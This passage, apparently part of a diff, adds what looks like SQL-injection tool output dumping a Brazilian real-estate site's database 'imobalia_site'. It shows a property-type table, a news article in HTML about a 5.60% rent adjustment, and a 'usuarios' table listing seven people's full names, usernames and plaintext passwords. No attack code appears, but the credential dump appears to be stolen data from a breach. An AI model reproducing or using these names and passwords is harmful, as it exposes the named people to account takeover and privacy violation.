+| Apartamento    | 8      |
+| Sala Comercial | 9      |
+| Sítio          | 10     |
+| Lote           | 11     |
++----------------+--------+
+
+Database: imobalia_site
+Table: noticias
+[1 entry]
++--------------------------------------------------------------------------------------------------------+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+--------+
+| link                                                                                                   | data       | texto                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | titulo                                                           | codigo |
++--------------------------------------------------------------------------------------------------------+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+--------+
+| http://www.secovi.com.br/noticias/aluguel-residencial-com-aniversario-em-dezembro-pode-subir-560/7179/ | 2014-01-17 | <h1 id="ctl00_ctl05_controlFixo_ctl00_h1Titulo" class="title1 red" style="padding: 0px; margin: 0px 0px 0.5em; vertical-align: baseline; font-family: Arial, Helvetica, sans-serif; zoom: 1; letter-spacing: -1px; color: rgb(174, 0, 1);">Aluguel residencial com aniversário em dezembro pode subir 5,60%</h1><p style="margin: 0px 0px 1em; color: rgb(102, 102, 102); font-family: Arial, Helvetica, sans-serif; font-size: 12px;"><big id="ctl00_ctl05_controlFixo_ctl00_bgChamada">Essa é a variação acumulada em 12 meses pelo IGP-M, indicador que corrige a maior parte dos contratos de locação </big><br><small id="ctl00_ctl05_controlFixo_ctl00_smAutor" style="font-size: 0.9em;">02/12/2013</small></p><div class="notice-img" style="width: 281px; overflow: hidden; float: left; margin-right: 1em; background-color: rgb(236, 236, 236); margin-bottom: 1em; color: rgb(102, 102, 102); font-family: Arial, Helvetica, sans-serif; font-size: 12px;"><img src="http://www.secovi.com.br/files/Noticias/caneta_5_281_242_3.jpg" id="ctl00_ctl05_controlFixo_ctl00_imgPrincipal" alt="Aluguel residencial com aniversário em dezembro pode subir 5,60%" title="Título da imagem" style="border: 0px;"></div><p style="margin: 0px 0px 1em; color: rgb(102, 102, 102); font-family: Arial, Helvetica, sans-serif; font-size: 12px; text-align: justify;">O aluguel residencial em andamento com aniversário em dezembro e correção pelo IGP-M (Índice Geral de Preços - Mercado), da FGV (Fundação Getúlio Vargas), sofrerá atualização de 5,60% no seu valor.</p><p style="margin: 0px 0px 1em; color: rgb(102, 102, 102); font-family: Arial, Helvetica, sans-serif; font-size: 12px; text-align: justify;">O IGP-M é eleito como um dos principais indicadores para reajustes contratuais por ser o primeiro a ser divulgado, ainda dentro do mês de referência. Assim, a divulgação de variação mensal de 0,29% no mês de novembro, fecha o comportamento dos preços no período compreendido entre os meses de dezembro de 2012 a novembro deste ano (12 meses).</p><p style="margin: 0px 0px 1em; color: rgb(102, 102, 102); font-family: Arial, Helvetica, sans-serif; font-size: 12px; text-align: justify;">Para facilitar o cálculo do novo aluguel, o Secovi-SP (Sindicato da Habitação) divulga fator de atualização, que no caso será de 1,0560. Por exemplo: para atualizar um aluguel de R$ 1.500,00 que vigorou até novembro de 2013, realiza-se a multiplicação de R$1.500,00 por 1,0560, que resultará em R$ 1.584,00, que é o aluguel de novembro a ser pago no final do mês de dezembro ou início de Janeiro.</p> | Aluguel residencial com aniversário em dezembro pode subir 5,60% | 4      |
++--------------------------------------------------------------------------------------------------------+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+--------+
+
+Database: imobalia_site
+Table: usuarios
+[7 entries]
++-------------------------+-------+--------+----------+
+| nome                    | senha | codigo | usuario  |
++-------------------------+-------+--------+----------+
+| Clayton                 | 1234  | 1      | clayton  |
+| Everton Lopes           | e123  | 2      | Everton  |
+| teste                   | teste | 4      | teste    |
+| Debora Parusssolo       | f456  | 5      | Debora   |
+| Gustavo Galego          | g789  | 6      | Gustavo  |
+| Eliana Maria dos Santos | e101  | 7      | Eliana   |
+| Fernanda Roque da Silva | f102  | 8      | Fernanda |
++-------------------------+-------+--------+----------+
+
